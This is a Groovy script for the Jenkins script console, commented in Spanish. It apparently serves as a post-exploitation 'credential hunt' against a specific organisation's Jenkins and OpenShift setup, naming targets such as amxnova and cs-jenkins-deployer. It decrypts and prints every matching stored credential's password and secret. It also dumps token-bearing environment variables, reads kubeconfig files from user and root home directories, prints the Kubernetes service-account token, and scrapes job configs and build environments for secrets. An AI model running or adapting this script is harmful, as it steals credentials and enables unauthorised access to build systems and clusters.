// OpenShift credential hunt in Jenkins
// Busca tokens, creds y config de OpenShift en el entorno Jenkins

import jenkins.model.Jenkins
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*
import com.cloudbees.plugins.credentials.domains.*

println "=== OPENSHIFT CREDENTIAL HUNT ==="
println ""

// 1. Buscar en todas las credenciales Jenkins cualquier cosa que huela a OpenShift/Kubernetes
println "--- [1] CREDENCIALES CON 'openshift/oc/kube/amxnova/deployer' ---"
def credStores = [
    SystemCredentialsProvider.getInstance().getStore(),
    SystemCredentialsProvider.getInstance()
]

def allCreds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.Credentials.class,
    Jenkins.getInstance(),
    hudson.security.ACL.SYSTEM,
    []
)

allCreds.each { cred ->
    def id = cred.id ?: "?"
    def desc = cred.description ?: ""
    def lower = (id + desc).toLowerCase()
    if (lower.contains("openshift") || lower.contains("amxnova") || lower.contains("deployer") || 
        lower.contains("kube") || lower.contains("oc-") || lower.contains("-oc") || 
        lower.contains("token") || lower.contains("bearer") || lower.contains("sophia")) {
        println "MATCH CRED:"
        println "  ID: ${id}"
        println "  Desc: ${desc}"
        println "  Type: ${cred.getClass().simpleName}"
        if (cred.hasProperty('username')) println "  User: ${cred.username}"
        if (cred.hasProperty('password')) println "  Pass: ${cred.password?.plainText}"
        if (cred.hasProperty('secret')) println "  Secret: ${cred.secret?.plainText}"
        println "---"
    }
}

// 2. Buscar en variables de entorno del nodo master
println ""
println "--- [2] ENV VARS (openshift/kube/token/oc_) ---"
System.getenv().each { k, v ->
    def kl = k.toLowerCase()
    if (kl.contains("openshift") || kl.contains("kube") || kl.contains("token") || 
        kl.contains("oc_") || kl.contains("amxnova") || kl.contains("bearer") ||
        kl.contains("kubeconfig")) {
        println "  ${k} = ${v}"
    }
}

// 3. Buscar archivos de config de oc/kubectl en el home del usuario jenkins
println ""
println "--- [3] OC/KUBECTL CONFIG FILES ---"
def homeDirs = ["/var/jenkins_home", "/home/jenkins", "/root", System.getProperty("user.home")]
homeDirs.each { home ->
    def paths = [
        "${home}/.kube/config",
        "${home}/.config/kube/config",
        "${home}/.openshift/config",
        "${home}/.oc/config"
    ]
    paths.each { p ->
        def f = new File(p)
        if (f.exists() && f.canRead()) {
            println "\nFOUND: ${p}"
            println f.text.take(3000)
            println "..."
        }
    }
}

// 4. Buscar en jobs de Jenkins configs que mencionen OpenShift
println ""
println "--- [4] JOBS CON OC/OPENSHIFT/AMXNOVA EN CONFIG ---"
def keywords = ["openshift", "oc login", "oc project", "amxnova", "cs-jenkins-deployer", 
                "kubectl", "kubeconfig", "OPENSHIFT_TOKEN", "BEARER", "8443"]

Jenkins.getInstance().getAllItems(hudson.model.Job.class).each { job ->
    try {
        def config = job.configFile?.asString() ?: ""
        if (config == "") {
            // Try XML config
            def xml = new File(job.getRootDir(), "config.xml")
            if (xml.exists()) config = xml.text
        }
        def cfgLower = config.toLowerCase()
        def found = keywords.any { kw -> cfgLower.contains(kw.toLowerCase()) }
        if (found) {
            println "\nJOB: ${job.fullName}"
            // Extract relevant lines
            config.split("\n").each { line ->
                def ll = line.toLowerCase()
                if (keywords.any { kw -> ll.contains(kw.toLowerCase()) }) {
                    println "  >> ${line.trim()}"
                }
            }
        }
    } catch(e) {
        // skip
    }
}

// 5. Buscar token de service account (si Jenkins corre en un pod OpenShift)
println ""
println "--- [5] SERVICE ACCOUNT TOKEN (pod interno) ---"
def saToken = new File("/var/run/secrets/kubernetes.io/serviceaccount/token")
def saNamespace = new File("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
def saCert = new File("/var/run/secrets/kubernetes.io/serviceaccount/ca.crt")

if (saToken.exists()) {
    println "SA TOKEN: ${saToken.text}"
    println "NAMESPACE: ${saNamespace.exists() ? saNamespace.text : 'N/A'}"
    println "CA CRT EXISTS: ${saCert.exists()}"
} else {
    println "No SA token found (Jenkins no corre en pod K8s)"
}

// 6. Buscar secrets y env en build history de jobs deploy
println ""
println "--- [6] VARIABLES EN BUILDS RECIENTES (oc/openshift jobs) ---"
Jenkins.getInstance().getAllItems(hudson.model.Job.class).each { job ->
    try {
        def jn = job.fullName.toLowerCase()
        if (jn.contains("openshift") || jn.contains("deploy") || jn.contains("amxnova") || 
            jn.contains("oc") || jn.contains("release") || jn.contains("infra")) {
            println "\nJOB: ${job.fullName}"
            def lastBuild = job.getLastBuild()
            if (lastBuild) {
                lastBuild.getEnvironments().each { env ->
                    env.buildEnvVars(lastBuild, [:]).each { k, v ->
                        def kl = k.toLowerCase()
                        if (kl.contains("token") || kl.contains("pass") || kl.contains("secret") || 
                            kl.contains("openshift") || kl.contains("kube") || kl.contains("oc")) {
                            println "  ${k} = ${v}"
                        }
                    }
                }
            }
        }
    } catch(e) {
        // skip
    }
}

println ""
println "=== FIN HUNT ==="
